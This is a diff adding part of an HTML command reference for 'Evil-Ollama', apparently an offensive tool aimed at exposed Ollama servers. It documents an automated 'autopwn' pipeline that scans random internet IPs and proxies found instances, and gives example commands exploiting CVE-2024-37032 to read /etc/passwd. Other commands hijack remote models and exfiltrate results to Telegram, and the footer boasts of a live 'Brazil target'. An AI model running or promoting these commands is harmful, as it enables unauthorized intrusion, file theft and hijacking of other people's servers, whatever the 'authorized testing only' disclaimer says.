+                    <span class="cmd-status status-verified">✅ Verified</span>
+                    <div class="example-box" style="margin-top:10px;">
+                        <span class="prompt">$ evilollama export --format html --notify</span>
+                        <br><span class="output">📄 HTML report saved: evilollama_report.html (8.0 KB)</span>
+                        <br><span class="output">📄 Report sent to Telegram ✅</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 9. AUTOMATION -->
+        <!-- ============================================================ -->
+        <div class="section" id="autopwn">
+            <div class="section-title"><span class="icon">🚀</span> Automation</div>
+            <div class="cmd-grid">
+                <div class="cmd-card" style="border-color: var(--red); border-width: 1px;">
+                    <div class="cmd-name">autopwn --random &lt;N&gt;</div>
+                    <div class="cmd-desc"><strong>FULL AUTO-PWN PIPELINE</strong> — 4 steps automated:<br>
+                        1. Scan N random IPs<br>
+                        2. Geolocate all finds<br>
+                        3. Vulnerability scan (can skip with --no-vuln)<br>
+                        4. Generate HTML report<br>
+                        5. Start proxy on first found instance
+                    </div>
+                    <div class="cmd-flags">
+                        <span>--random 5000</span> <span>--no-vuln</span>
+                        <span>-p 9090</span> <span>--geo</span> <span>--notify</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">monitor --interval &lt;SEC&gt;</div>
+                    <div class="cmd-desc">Continuous monitoring daemon. Scans every N seconds, auto-exports, sends Telegram notifications on new finds. Perfect for persistent hunting.</div>
+                    <div class="cmd-flags">
+                        <span>--interval 3600</span> <span>--random 5000</span>
+                        <span>--notify</span> <span>--export html</span>
+                    </div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 10. CONFIG -->
+        <!-- ============================================================ -->
+        <div class="section" id="config">
+            <div class="section-title"><span class="icon">⚙️</span> Configuration</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">config --show</div>
+                    <div class="cmd-desc">Display current configuration (sensitive values masked). Shows telegram_token, telegram_chat_id, shodan_key, and all settings.</div>
+                    <div class="cmd-flags"><span>--show</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">config --set KEY VALUE</div>
+                    <div class="cmd-desc">Set any configuration key to a value. Config is saved to ~/.evilollama/config.json</div>
+                    <div class="cmd-flags"><span>--set notify_on_find true</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">config --telegram-token BOT_TOKEN</div>
+                    <div class="cmd-desc">Set Telegram bot token for notifications.</div>
+                    <div class="cmd-flags"><span>--telegram-token "123:ABC"</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">config --telegram-chat CHAT_ID</div>
+                    <div class="cmd-desc">Set Telegram chat ID for notifications.</div>
+                    <div class="cmd-flags"><span>--telegram-chat "123456"</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">config --shodan-key API_KEY</div>
+                    <div class="cmd-desc">Set Shodan API key for Shodan search mode.</div>
+                    <div class="cmd-flags"><span>--shodan-key "API_KEY"</span></div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 11. GLOBAL FLAGS -->
+        <!-- ============================================================ -->
+        <div class="section">
+            <div class="section-title"><span class="icon">📌</span> Global Flags</div>
+            <div class="cmd-grid">
+                <div class="cmd-card">
+                    <div class="cmd-name">--version / -v</div>
+                    <div class="cmd-desc">Display version information with tool description and install command.</div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">--help / -h</div>
+                    <div class="cmd-desc">Show help for any command with all flags and usage examples.</div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">--geo</div>
+                    <div class="cmd-desc">Show geolocation data (city, country, ISP) for targets. Uses ip-api.com.</div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+
+                <div class="cmd-card">
+                    <div class="cmd-name">--notify</div>
+                    <div class="cmd-desc">Send Telegram notification with results. Requires configured telegram_token and chat_id.</div>
+                    <span class="cmd-status status-verified">✅ Verified</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- 12. EXAMPLES -->
+        <!-- ============================================================ -->
+        <div class="section" id="examples">
+            <div class="section-title"><span class="icon">🎯</span> Real-World Examples</div>
+            
+            <div class="quick-start">
+                <h3>🔍 Recon Phase</h3>
+                <code class="prompt"># Internet-wide scan with notification</code>
+                <code>evilollama scan --internet --notify</code>
+                
+                <code class="prompt" style="margin-top:12px;"># Shodan search</code>
+                <code>evilollama scan --shodan $(cat ~/.shodan_key) --geo --export html</code>
+
+                <code class="prompt" style="margin-top:12px;"># DNS discovery on target domain</code>
+                <code>evilollama scan --dns target.com --port 11434</code>
+            </div>
+
+            <div class="quick-start">
+                <h3>💀 Exploitation Phase</h3>
+                <code class="prompt"># Check for CVE-2024-37032</code>
+                <code>evilollama exploit --cve CVE-2024-37032 -t 1.2.3.4:11434</code>
+
+                <code class="prompt" style="margin-top:12px;"># Full file read exploit (requires public IP)</code>
+                <code>evilollama exploit --cve CVE-2024-37032 -t 1.2.3.4:11434 --host $(curl -s ifconfig.me) --read /etc/passwd</code>
+
+                <code class="prompt" style="margin-top:12px;"># Full vuln scan + report to Telegram</code>
+                <code>evilollama vuln -t 1.2.3.4:11434 --geo --notify -o vuln_report.json</code>
+            </div>
+
+            <div class="quick-start">
+                <h3>🤖 AI Operations</h3>
+                <code class="prompt"># Interactive chat with remote model</code>
+                <code>evilollama chat -t 1.2.3.4:11434</code>
+
+                <code class="prompt" style="margin-top:12px;"># Use remote model via OpenAI-compatible proxy</code>
+                <code>evilollama proxy -t 1.2.3.4:11434 -p 8080</code>
+                <code class="output">curl http://localhost:8080/v1/chat/completions -d '{"model":"gemma:2b","messages":[{"role":"user","content":"hi"}]}'</code>
+            </div>
+
+            <div class="quick-start">
+                <h3>🚀 Full Auto-PWN Pipeline</h3>
+                <code class="prompt"># One command: scan → vuln → report → proxy</code>
+                <code>evilollama autopwn --random 10000 --notify</code>
+            </div>
+
+            <div class="quick-start">
+                <h3>📤 Export & Share</h3>
+                <code class="prompt"># Export all formats and send to Telegram</code>
+                <code>evilollama export --format all --notify</code>
+
+                <code class="prompt" style="margin-top:12px;"># Show instances with geo and export</code>
+                <code>evilollama show --geo --export html</code>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- FOOTER -->
+        <!-- ============================================================ -->
+        <div class="footer">
+            <p>🦙 Evil-Ollama v3.2.0 — For authorized security testing only</p>
+            <p style="margin-top:8px;">
+                <a href="https://github.com/evogix/Evil-Ollama" target="_blank">GitHub</a> &bull;
+                <a href="https://pypi.org/project/evil-ollama/" target="_blank">PyPI</a> &bull;
+                <a href="https://github.com/evogix/Evil-Ollama/issues" target="_blank">Report Bug</a>
+            </p>
+            <p style="margin-top:8px; font-size:0.75rem;">
+                <span class="glow-dot"></span> Live from Brazil target — 45 models, 323 GB, 0.20.7
+            </p>
+        </div>
+    </div>
+</body>
+</html>
